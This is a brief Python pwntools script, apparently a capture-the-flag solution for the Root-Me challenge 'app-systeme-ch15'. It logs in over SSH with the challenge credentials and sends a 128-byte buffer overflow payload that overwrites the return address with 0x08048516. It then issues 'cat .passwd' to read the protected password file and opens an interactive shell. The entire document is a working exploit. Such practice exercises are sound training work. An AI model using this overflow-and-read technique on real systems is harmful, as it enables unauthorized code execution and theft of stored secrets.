from pwn import*

s = ssh(host='challenge02.root-me.org' ,user='app-systeme-ch15' ,password='app-systeme-ch15',port=2222)
p = s.process('./ch15')

payload = b"a"*128 + p32(0x08048516)
p.sendline(payload)

p.sendline('cat .passwd')
p.interactive()
